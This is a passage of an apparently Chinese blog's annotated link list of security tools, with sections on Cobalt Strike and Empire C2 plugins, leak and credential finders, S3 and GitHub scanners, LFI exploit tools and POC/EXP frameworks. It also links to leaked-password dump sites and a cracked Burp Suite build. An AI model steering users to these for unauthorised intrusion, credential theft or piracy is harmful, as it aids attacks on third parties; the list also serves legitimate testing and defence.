class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;CEI1XYkq2PZmYsP0DRU7jg 使用 Aggressor 脚本雕饰 Cobalt Strike</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;armitage CobaltStrike 社区版，调用 msf，一对多带界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anbai-inc&#x2F;CobaltStrike_Hanization CobaltStrike2.5 汉化版，以 msf 库为基础，3.0 以后改版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rsmudge&#x2F;cortana-scripts 用于 cs2.x 与 armitage 的可拓展插件，cvs3.x 的为 AggressorScripts</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;harleyQu1nn&#x2F;AggressorScripts cs3.0 以后的脚本搜集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FortyNorthSecurity&#x2F;AggressorAssessor cs3.x 自动化攻击脚本集合</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CS_Chinese_support&#x2F; cs3.0 传输信息的汉化插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;verctor&#x2F;CS_xor64 生成 cobaltstrike 所需的 xor64.bin</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ryhanson&#x2F;ExternalC2 一个用于将通信渠道与 Cobalt Strike External C2 服务器集成的库</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;threatexpress&#x2F;cs2modrewrite 用于将 Cobalt Strike 配置文件转换为 mod_rewrite 脚本的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Mr-Un1k0d3r&#x2F;CatMyFish 搜索分类域，为 Cobalt Strike beacon C&amp;C 设置白名单域</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;threatexpress&#x2F;malleable-c2 利用 jquery 文件进行 C2 通讯，在文件内做了 JS 混淆绕过防火墙</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dcsync&#x2F;pycobalt py3,Python API for Cobalt Strike</span><br><span class="line">https:&#x2F;&#x2F;www.cobaltstrike.com&#x2F;aggressor-script&#x2F;cobaltstrike.html CobaltStrike 相关插件编写，一对多带界面</span><br></pre></td></tr></table></figure><h3 id="Empire-相关工具拓展插件"><a href="#Empire-相关工具拓展插件" class="headerlink" title="Empire 相关工具拓展插件"></a>Empire 相关工具拓展插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paper.tuisec.win&#x2F;detail&#x2F;f3dce68a0b4baaa 利用 Empire 获取域控权限</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire-GUI empire 的 node.js 界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;interference-security&#x2F;empire-web empire 的 web 界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;DeathStar py3,调用 Empire RESTful API 自动化获取域管权限的</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;infosecn1nja&#x2F;e2modrewrite 用于将 Empire 配置文件转换为 Apache modrewrite 脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maxchehab&#x2F;CSS-Keylogging Chrome 扩展程序和 Express 服务器利用 CSS 的键盘记录功能。</span><br></pre></td></tr></table></figure><h3 id="敏感信息泄露发现"><a href="#敏感信息泄露发现" class="headerlink" title="敏感信息泄露发现"></a>敏感信息泄露发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Yelp&#x2F;detect-secrets PY,防止代码中的密码等相关敏感信息被提交到代码库中，可以在保证安全性的同时不会给开发者的生产力带来任何影响</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Acceis&#x2F;leakScraper 处理和可视化大规模文本文件, 查找敏感信息, 例如证书</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Raikia&#x2F;CredNinja 多线程用户凭证验证脚本，比如验证 dump 的 hash 是否属于此机器，利用 445 端口进行协议验证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CERTCC&#x2F;keyfinder 查找并分析私钥&#x2F;公钥文件(文件系统中), 支持 Android APK 文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ice3man543&#x2F;hawkeye go，cli 端，文件系统分析工具，快速查找文件内包含的 SSH 密钥，日志文件，Sqlite 数据库，密码文件等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FortyNorthSecurity&#x2F;EyeWitness 获取目标网站截图、vnc、rdp 服务，尝试获取默认凭证</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;D4Vinci&#x2F;Cr3dOv3r 根据邮箱自动搜索泄漏的密码信息，也可测试账户密码在各大网站能否登录的工具</span><br></pre></td></tr></table></figure><h3 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析"></a>威胁情报分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.databases.today，https:&#x2F;&#x2F;publicdbhost.dmca.gripe&#x2F;，http:&#x2F;&#x2F;www.wttech.org&#x2F;，https:&#x2F;&#x2F;hashes.org&#x2F;leaks.php，https:&#x2F;&#x2F;archive.org&#x2F;search.php?query&#x3D; 密码泄露</span><br><span class="line">https:&#x2F;&#x2F;www.threatcrowd.org&#x2F; 威胁情报分析平台</span><br><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F; 微步在线 | 威胁情报分析平台-ThreatBook-多引擎在线扫描、恶意软件在线检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;needmorecowbell&#x2F;sniff-paste 针对 Pastebin 的开源情报收集工具</span><br><span class="line">https:&#x2F;&#x2F;talosintelligence.com&#x2F;documents&#x2F;ip-blacklist 恶意 IP 地址</span><br><span class="line">https:&#x2F;&#x2F;ransomwaretracker.abuse.ch&#x2F;downloads&#x2F;RW_IPBL.txt 恶意软件 IP 地址</span><br><span class="line">https:&#x2F;&#x2F;check.torproject.org&#x2F;cgi-bin&#x2F;TorBulkExitList.py?ip&#x3D;1.1.1.1 洋葱路由出口节点</span><br><span class="line">https:&#x2F;&#x2F;isc.sans.edu&#x2F;api&#x2F;threatlist&#x2F;shodan shodan 撒旦扫描器节点</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Te-k&#x2F;harpoon 用于开源和威胁智能的 CLI 工具</span><br><span class="line">https:&#x2F;&#x2F;trumail.io&#x2F; 验证对方邮箱是否为垃圾邮箱，每个月可以免费验证 1000 次</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ChrisJohnRiley&#x2F;Scythe 验证账号是否为常用账号</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;GeoLogonalyzer 远程身份验证地理位置分析工具，用于区分合法登录和恶意登录。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;target&#x2F;strelka py3，通过实时扫描文件进行威胁情报分析和实时监测。</span><br></pre></td></tr></table></figure><h3 id="托管云安全"><a href="#托管云安全" class="headerlink" title="托管云安全"></a>托管云安全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stuhirst&#x2F;awssecurity&#x2F;blob&#x2F;master&#x2F;arsenal.md AWS 安全检测相关的项目列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;toniblyx&#x2F;my-arsenal-of-aws-security-tools AWS 安全工具集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sa7mon&#x2F;S3Scanner 扫描 amazon 公开的 S3 buckets 和 dump</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kromtech&#x2F;s3-inspector 检测亚马逊 AWS S3 bucket permissions</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jordanpotti&#x2F;AWSBucketDump 枚举 AWS S3 buckets 以查找敏感机密的文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sa7mon&#x2F;S3Scanner 扫描 amazon 公开的 S3 buckets 和 dump</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;kromtech&#x2F;s3-inspector 检测亚马逊 AWS S3 bucket permissions</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jordanpotti&#x2F;AWSBucketDump 枚举 AWS S3 buckets 以查找敏感机密的文件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Netflix&#x2F;repokid AWS 最低权限策略部署工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RhinoSecurityLabs&#x2F;pacu AWS 漏洞检测框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xbug&#x2F;Hawkeye GitHub 泄露监控系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;neal1991&#x2F;gshark github 信息泄露检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;VKSRC&#x2F;Github-Monitor GitHub 监控，代码信息泄露，分钟级监控，邮件预警</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;metac0rtex&#x2F;GitHarvester github Repo 信息搜集工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;repoog&#x2F;GitPrey GitHub 敏感信息扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FeeiCN&#x2F;GSIL py3，近实时监控 Github 敏感信息，并发送告警通知。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UnkL4b&#x2F;GitMiner github 敏感内容挖掘</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dxa4481&#x2F;truffleHog GitHub 敏感信息扫描工具,包括检测 commit 等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Hell0W0rld0&#x2F;Github-Hunter github 信息监测脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;awslabs&#x2F;git-secrets 防止将敏感数据提交到 git 仓库的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zricethezav&#x2F;gitleaks 基于 go 的，检查 git repo 中的密码信息和密钥</span><br></pre></td></tr></table></figure><h3 id="目录路径发现"><a href="#目录路径发现" class="headerlink" title="目录路径发现"></a>目录路径发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch 经典目录路径扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TheM4hd1&#x2F;PenCrawLer C#界面，web 爬虫与目录路径爆破工具，除了常规扫描增加了递归爆破模式</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Xyntax&#x2F;DirBrute 目录路径爆破工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;abaykan&#x2F;crawlbox 目录路径路径扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;deibit&#x2F;cansina 目录路径路径扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;Breacher 多线程的后台路径扫描器，也可用于发现 Execution After Redirect 漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fnk0c&#x2F;cangibrina 通过字典穷举、google、robots.txt 等途径的跨平台后台管理路径扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Go0s&#x2F;SitePathScan 基于协程的目录路径爆破工具，配合 aiohttp 扫描路径比之前快了三倍有余</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secfree&#x2F;bcrpscan 基于爬虫的 web 路径扫描器</span><br></pre></td></tr></table></figure><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hvqzao&#x2F;liffy 本地文件包含漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;D35m0nd142&#x2F;Kadabra 本地文件包含漏洞扫描和利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;P0cL4bs&#x2F;Kadimus 本地文件包含漏洞扫描和利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;D35m0nd142&#x2F;LFISuite 本地文件包含漏洞利用及扫描工具，支持反弹 shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OsandaMalith&#x2F;LFiFreak 本地文件包含漏洞利用及扫描工具，支持反弹 shell</span><br></pre></td></tr></table></figure><h3 id="安全测试与扫描器框架"><a href="#安全测试与扫描器框架" class="headerlink" title="安全测试与扫描器框架"></a>安全测试与扫描器框架</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zaproxy&#x2F;zaproxy The OWASP ZAP core project 出品的综合性渗透测试工具。由于其流量代理、请求重放和可扩展性拿来做模糊测试未尝不可</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;x-Ai&#x2F;BurpUnlimitedre burpsuite 1.7.27 的永久破解版</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;andresriancho&#x2F;w3af 知名插件化扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;juansacco&#x2F;exploitpack 渗透测试集成框架，包含超过 38,000+ exploits</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Lucifer1993&#x2F;AngelSword Web 应用漏洞扫描框架,python3，300poc</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Xyntax&#x2F;POC-T 渗透测试插件化扫描框架，自带 poc，并发扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;Pocsuite 知道创宇维护的一个规范化 POC&#x2F;EXP 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;leisurelicht&#x2F;Pocsuite3 Pocsuite 用 py3 重写</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Eitenne&#x2F;roxysploit 漏洞利用框架，支持永恒之蓝直接利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TophantTechnology&#x2F;osprey 斗象能力中心出品并长期维护的一个规范化</span><br></pre></td></tr></table></figure><h3 id="POC-EXP-利用框架"><a href="#POC-EXP-利用框架" class="headerlink" title="POC/EXP 利用框架"></a>POC/EXP 利用框架</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;he1m4n6a&#x2F;btScan 大黑阔的插件化漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;boy-hack&#x2F;w9scan python 下内置 1200+插件可对网站进行一次规模的检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WooYun&#x2F;TangScan 乌云维护的一个规范化 POC&#x2F;EXP 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n0tr00t&#x2F;Beebeeto-framework Beebeeto 是由众多安全研究人员所共同维护的一个规范化 POC&#x2F;EXP 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;erevus-cn&#x2F;pocscan 一款开源 Poc 调用框架,可轻松调用 Pocsuite,Tangscan,Beebeeto,Knowsec 老版本 POC，可使用 docker 部署</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DavexPro&#x2F;PocHunter 借鉴 pocscan 的一款多利用框架 poc 适配框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;theInfectedDrake&#x2F;TIDoS-Framework 覆盖从侦察到漏洞分析的所有内容</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gyoisamurai&#x2F;GyoiThon 使用深度学习的渗透测试工具, 从每次扫描数据中学习, 扫描越多, 软件检测精准度越高</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;euphrat1ca&#x2F;polar-scan 易语言的北极熊扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;euphrat1ca&#x2F;yeezy-scan 椰树 1.9 扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;euphrat1ca&#x2F;WebCruiserWVS 轻量级基于 C#的扫描器，椰树扫描器的前身</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Skycrab&#x2F;leakScan web 界面，漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;az0ne&#x2F;AZScanner web 界面，自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;boy-hack&#x2F;w8scan web 界面，基于 bugscan 扫描和架构思想的扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MiniSafe&#x2F;microweb web 界面，base bugscan，django</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;taipan-scanner&#x2F;Taipan web 界面，基于 F#与 C#的安全扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zhangzhenfeng&#x2F;AnyScan web 界面，python 漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Canbing007&#x2F;wukong-agent web 界面，python 漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dermotblair&#x2F;webvulscan web 界面，php，漏洞扫描器，支持输出 pdf 报告</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jeffzh3ng&#x2F;InsectsAwake web 界面，基于 Flask 应用框架的漏洞扫描系统，同时集成了渗透测试常用的端口扫描、子域名爆破等功能，后端漏洞扫描采用 Pocsuite</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xInfection&#x2F;TIDoS-Framework py，linux，网站扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secdec&#x2F;adapt py,linux，网站扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sullo&#x2F;nikto perl，linux，kali 内置的网站扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Ekultek&#x2F;Zeus-Scanner web 扫描器，联动 Geckodriver，nmap 和 sqlmap</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackye&#x2F;lalascan 集合 owasp top10 漏洞扫描和边界资产发现能力的分布式 web 漏洞扫描框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackye&#x2F;BkScanner BkScanner 分布式、插件化 web 漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tlkh&#x2F;prowler 一款基于 Raspberry Pi Cluster 的网络漏洞扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;netxfly&#x2F;passive_scan 基于 http 代理的 web 漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;1N3&#x2F;Sn1per php，自动化中间件扫描以及设备指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Tuhinshubhra&#x2F;RED_HAWK php，集成信息收集、漏洞扫描、指纹识别等的扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;Spaghetti web 应用扫描器，支持指纹识别、文件目录爆破、SQL&#x2F;XSS&#x2F;RFI 等漏洞扫描，也可直接用于 struts、ShellShock 等漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;v3n0m-Scanner&#x2F;V3n0M-Scanner 支持检测 SQLi&#x2F;XSS&#x2F;LFI&#x2F;RFI 等漏洞的扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Yukinoshita47&#x2F;Yuki-Chan-The-Auto-Pentest 集成子域名枚举、nmap、waf 指纹识别等模块的 web 应用扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RASSec&#x2F;pentestEr_Fully-automatic-scanner 定向自动测试工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Fireflyi&#x2F;lcyscan py，插件化漏洞扫描器，支持生成报表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Arachni&#x2F;arachni Web 应用漏洞扫描框架，支持 REST、RPC 等 api 调用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;DamnWebScanner 基于 chrome&#x2F;opera 插件的被动式漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xsauby&#x2F;yasuo ruby,扫描主机第三方 web 应用服务漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;yangbh&#x2F;Hammer Web 应用漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;viraintel&#x2F;OWASP-Nettacker 自动化渗透测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;flipkart-incubator&#x2F;watchdog 全面的 web 扫描器与漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Fplyth0ner-Combie&#x2F;Bug-Project-Framework 易语言，模仿 msf 的漏洞利用框架，自带 exp 编辑器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerScript&#x2F;KatanaFramework py，模仿 msf 的漏洞利用框架，还有些 ssh、压缩包破解工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;Galileo py2，网站扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;samhaxr&#x2F;hackbox py2，simple，网站扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;secrary&#x2F;EllaScanner py3，simple，被动式漏洞扫描，支持历史 cve 编号漏洞识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;WAScan py，simple，扫描页面&#x2F;链接&#x2F;脚本&#x2F;Form, 测试 Payload 等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jiangsir404&#x2F;S7scan py,已用 1，七种综合检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hatRiot&#x2F;clusterd py，simple，web 漏洞利用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;M4cs&#x2F;BabySploit py,simple,模仿 msf</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;iceyhexman&#x2F;onlinetools simple，web 界面，在线 cms 指纹识别|旁站|c 段|信息泄露|工控|系统|物联网安全|cms 漏洞扫描|端口扫描|等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tulpar&#x2F;tulpar simple,支持多种 web 漏洞扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;Striker simple，信息搜集、cms 利用与漏扫，侦察绕过 Cloudflare</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0x4D31&#x2F;salt-scanner 基于 Salt Open 以及 Vulners Linux Audit API 的 linux 漏洞扫描器，支持与 JIRA、slack 平台结合使用</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;opensec-cn&#x2F;kunpeng go，POC 检测框架，以动态链接库的形式提供各种语言调用</span><br></pre></td></tr></table></figure><h3 id="运维安全服务与资产管理"><a href="#运维安全服务与资产管理" class="headerlink" title="运维安全服务与资产管理"></a>运维安全服务与资产管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chaitin&#x2F;cloudwalker CloudWalker（牧云）服务器安全管理平台，逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等功能。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mitre&#x2F;caldera mitre 公司模拟攻击测试系统，主要是在 win 下</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;guardicore&#x2F;monkey 评估网络安全状况，分为扫描器与 C2C 服务器，利用默认口令与 exp 对 ssh、smb 等多种协议方式进行攻击检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;PublicSecScan 调用 awvs 对大量 WEB 资产进行分布式 WEB 安全扫描，发现 web 环境下常规的一些安全漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jeffzh3ng&#x2F;Fuxi-Scanner 资产管理，漏洞检测集成 awvs、创宇 Pocsuite、nmap、hydra</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;infobyte&#x2F;faraday 协作渗透测试和漏洞管理平台，集成多种</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DefectDojo&#x2F;django-DefectDojo 基于 django 的漏洞资产管理平台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;creditease-sec&#x2F;insight web 界面，宜信安全部开发，集成应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的管理平台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RASSec&#x2F;A_Scan_Framework 漏洞管理、资产管理、任务扫描系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cea-sec&#x2F;ivre 网络资产指纹发现，搭建属于自己的 shodan 与 zoomeye</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ysrc&#x2F;xunfeng web 界面，同程安全开发的网络资产识别引擎，漏洞检测引擎</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;superhuahua&#x2F;xunfengES web 界面，base 巡风开发，一个人的安全</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zhaoweiho&#x2F;SecurityManageFramwork py3，django。企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;PublicMonitors 对公网 IP 列表进行端口服务扫描，发现周期内的端口服务变化情况和弱口令安全风险。一个人的安全部</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;grayddq&#x2F;PubilcAssetInfo 主要目标是以甲方安全人员的视角，尽可能收集发现企业的域名和服务器公网 IP 资产。如百度云、阿里云、腾讯云等。一个人的安全部</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maya6&#x2F;SiteScan web 界面，py3 celery。资产收集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ywolf&#x2F;F-NAScan py2.6，网络资产、端口服务搜集整理，生成报表显示。快速</span><br><span 